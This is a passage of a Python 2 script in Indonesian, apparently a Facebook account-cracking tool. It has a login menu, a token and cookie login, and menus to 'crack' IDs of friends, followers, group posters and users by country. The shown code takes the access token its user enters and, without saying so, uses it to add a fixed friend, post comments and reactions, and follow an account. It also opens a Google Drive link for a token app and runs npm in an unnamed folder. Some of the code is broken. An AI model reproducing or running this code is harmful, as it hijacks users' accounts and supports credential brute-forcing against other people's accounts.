#!/usr/bin/python2

# coding=utf-8

import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib

from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####

P  = '\033[1;97mIlham code'  # putih

M  = '\033[1;91mIlham code' # merah

H  = '\033[1;92m' # hijau

K = '\033[1;93m' # kuning

B  = '\033[1;94m' # biru

U  = '\033[1;95m' # ungu

O = '\033[1;96m' # biru muda

my_color = [P, M, H, K, B, U, O]

warna = random.choice(my_color)

warni = random.choice(my_color)

try:

	import mechanize

except ImportError:

	os.system("pip2 install mechanize")

try:

	import requests

except ImportError:

	os.system("pip2 install requests")

	os.system("python2 cr4ck.py")

from requests.exceptions import ConnectionError

from mechanize import Browser

from datetime import datetime

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

os.system("clear")

done = False

def animate():

    for c in itertools.cycle(['\033[1;96m|', '\033[1;92m/', '\033[1;95m-', '\033[1;91m\\']):

        if done:

            break

        sys.stdout.write('\r\033[1;93mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )

        sys.stdout.flush()

        time.sleep(0.1)

 

t = threading.Thread(target=animate)

t.start()

 

time.sleep(5)

done = True

def keluar():

	print "\033[1;97m{\033[1;91m!\033[1;97m} Keluar"

	os.sys.exit()

		

def acak(x):

    w = 'mhkbpcP'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

    

    

def cetak(x):

    w = 'mhkbpcP'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'%s;'%str(31+j))

    x += ''

    x = x.replace('!0','')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(0.03)

		

#########LOGO#########

logo = """ 

\033[1;91m██╗██╗░░░░░██╗░░██╗░█████╗░███╗░░░███╗

\033[1;91m██║██║░░░░░██║░░██║██╔══██╗████╗░████║

\033[1;91m██║██║░░░░░███████║███████║██╔████╔██║

\033[1;91m██║██║░░░░░██╔══██║██╔══██║██║╚██╔╝██║

\033[1;91m██║███████╗██║░░██║██║░░██║██║░╚═╝░██║

\033[1;91m╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝

\033[1;94m──────────────────────────────────────────────────

\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mAuthor   \033[1;91m: \033[1;96mIlham Ramadhan XD.

\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mInstagram   \033[1;91m: \033[1;96m@_ilhamGamtenx

\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mFacebook \033[1;91m: \033[1;96mfacebook.com/Itsme.PANGLIMA.ILHAM"""

back = 0

threads = []

berhasil = []

cekpoint = []

oks = []

oke = []

id = []

###### MASUK ######

def masuk():

	os.system('clear')

	print logo

	print 50* "\033[1;94m─"

	print "\033[1;97m{\033[1;92m01\033[1;97m} Login Via Token Facebook"

	print "\033[1;97m{\033[1;92m02\033[1;97m} Ambil Token Download Token App"

	print "\033[1;97m{\033[1;92m03\033[1;97m} Ambil Token Dari Link"

	print "\033[1;97m{\033[1;92m04\033[1;97m} Login Via Token Facebook"

	print "\033[1;97m{\033[1;91m00\033[1;97m} Keluar"

	print 50* "\033[1;94m─"

	pilih_masuk()

def pilih_masuk():

	msuk = raw_input("\033[1;90m︻デ═一▸ Mau Login lewat apa bro ? \033[91m:\033[1;92m ")

	if msuk =="":

		print"\033[1;97m[\033[1;91m!\033[1;97m] Ngetik apaan lo pepek?:v"

		pilih_masuk()

	elif msuk =="1" or msuk =="01":

		tokenz()

	elif msuk =="2"or msuk =="02":

		ambil_token()

	elif msuk =="3"or msuk =="03":

		ambil_link()

	elif msuk =="4"or msuk =="04":

		cookie()

	elif msuk =="0" or msuk =="00":

		keluar()

	else:

		print"\033[1;97m[\033[1;91m!\033[1;97m] Ngetik apaan lo pepek?:v"

		pilih_masuk()

		

#####LOGIN_COOKIE#####

def cookie():

    try:

          cek = open("cookies").read()

    except FileNotFoundError:

          cek = input("\033[00mCookies : \033[1;96m")

    cek = {"cookie":cek}

    ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content

    if "mbasic_logout_button" in str(ismi):

        if "Hallo Sob" in str(ismi):

            with open("cookies","w") as f:

                 f.write(cek["cookie"])

        else:

            try:

                 requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)

            except:

                 pass

        try:

             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]

             ses.get(mbasic.format(ikuti),cookies=cek)

        except:

             pass

        return cek["cookie"]

    else:

        print('\033[00mCookies \033[91mInvalid\033[00m')

        time.sleep(1)

        os.system('python fb.py')

			

#####LOGIN_TOKENZ#####

def tokenz():

	os.system('clear')

	print logo

	print 50* "\033[1;94m─"

	toket = raw_input("\033[1;97m{\033[1;95m?\033[1;97m} Token \033[1;91m:\033[1;92m ")

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		zedd = open("login.txt", 'w')

		zedd.write(toket)

		zedd.close()

		print '\033[1;97m{\033[1;92m✓\033[1;97m}\033[1;92m Login Berhasil'

		os.system('xdg-open https://facebook.com/Itsme.PANGLIMA.ILHAM')

		bot_komen()

	except KeyError:

		print "\033[1;97m{\033[1;91m!\033[1;97m} \033[1;91mToken salah !"

		time.sleep(1.7)

		masuk()

######AMBIL_TOKEN######

def ambil_token():

	os.system ("clear")

	print logo

	print 50* "\033[1;94m─"

	jalan("        \033[1;92mAnda Akan Di Arahkan Ke Browser ...")

	os.system('xdg-open https://drive.google.com/file/d/1eAuQG4aFIH49r0ACpoUWspnSG2VUl4Ci/view?usp=drivesdk')

	time.sleep(2)

	masuk()

	

##### AMBIL LINK #####

def ambil_link():

	os.system("clear")

	print logo

	print 50* "\033[1;94m─"

	jalan("\033[1;92mDilarang Menggunakan Akun Facebook Lama...")

	jalan("\033[1;92mWajib Menggunakan Akun Facebook Baru ...")

	jalan("\033[1;92mJika Ingin Menggunakan Akun Facebook Lama...")

	jalan("\033[1;92mWajib Menggunakan Aplikasi Yg Di Sediakan...")

	os.system ("cd ... && npm install")

	jalan ("\033[1;96mMulai...")

	os.system ("cd ... && npm start")

	raw_input("\n[ Kembali ]")

	masuk()

	

###### BOT KOMEN #######

def bot_komen():

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\033[1;97m[!] Token invalid"

		os.system('rm -rf login.txt')

	una = ('100000099406184')

	kom = ('lo gue doain😘')

	reac = ('ANGRY')

	post = ('3865137330166209')

	post2 = ('3865137330166209')

	kom2 = ('Login 😁')

	reac2 = ('LOVE')

	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)

	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)

	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)

	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)

	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)

	menu()

###### MENU #######

def menu():

	os.system('clear')

	try:

		toket = open('login.txt','r').read()

	except IOError:

		print "{!} Token Invalid !"

		os.system('clear')

		os.system('rm -rf login.txt')

		masuk()

	try:

		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		id = a['id']

	except KeyError:

		os.system('clear')

		print"\033[1;96m[!] \033[1;91mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		masuk()

		time.sleep(1)

		masuk()

	except requests.exceptions.ConnectionError:

		print"{!} Tidak ada koneksi"

		keluar()

	os.system("clear")

	print logo

	print 50* "\033[1;94m─"

	print "\033[1;97m{\033[1;96m•\033[1;97m}\033[1;95m NAMA\033[1;90m    =>\033[1;92m " +nama

	print "\033[1;97m{\033[1;96m•\033[1;97m}\033[1;95m USER ID\033[1;90m =>\033[1;92m " + id

	print 50* "\033[1;94m─"

	print "\033[1;97m{"+warni+"01\033[1;97m}"+warna+" Crack ID Dari Teman/Publik"

	print "\033[1;97m{"+warni+"02\033[1;97m}"+warna+" Crack ID Dari Postingan Grup/Teman"

	print "\033[1;97m{"+warni+"03\033[1;97m}"+warna+" Crack ID Dari Total Followers"

	print "\033[1;97m{"+warni+"04\033[1;97m}"+warna+" Cari ID Menggunakan Username"

	print "\033[1;97m{"+warni+"05\033[1;97m}"+warna+" Perbarui Script"

	print "\033[1;97m{\033[1;91m00\033[1;97m}"+warna+" Keluar"

	print 50* "\033[1;94m─"

	pilih()

	

######PILIH######

def pilih():

	unikers = raw_input("\033[1;92m︻デ═一▸ \033[91m:\033[1;92m ")

	if unikers =="":

		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"

		pilih()

	elif unikers =="1" or unikers =="01":

		crack_teman()

	elif unikers =="2" or unikers =="02":

		crack_likes()

	elif unikers =="3" or unikers =="03":

		crack_follow()

	elif unikers =="4" or unikers =="04":

		user_id()

	elif unikers =="5" or unikers =="05":

		perbarui()

	elif unikers =="0" or unikers =="00":

		os.system('clear')

		jalan('Menghapus token')

		os.system('rm -rf login.txt')

		keluar()

	else:

		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"

		pilih()

		

##### CRACK TEMAN/PUBLIK #####

def crack_teman():

	os.system("clear")

	print logo

	print 50* "\033[1;94m─"

	print "\033[1;97m{"+warna+"01\033[1;97m}"+warni+" Crack ID Indonesia"

	print "\033[1;97m{"+warna+"02\033[1;97m}"+warni+" Crack ID Bangladesh"

	print "\033[1;97m{"+warna+"03\033[1;97m}"+warni+" Crack ID Usa"

	print "\033[1;97m{"+warna+"04\033[1;97m}"+warni+" Crack ID Pakistan"

	print "\033[1;97m{\033[1;91m00\033[1;97m}"+warni+" Kembali"

	print 50* "\033[1;94m─"

	pilih_teman()

	

######PILIH######

def pilih_teman():

	univ = raw_input(""+warna+"︻デ═一▸ \033[91m:\033[1;92m ")

	if univ =="":

		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"

		pilih_teman()

	elif univ =="1" or univ =="01":

		crack_indo()

	elif univ =="2" or univ =="02":

		crack_bangla()
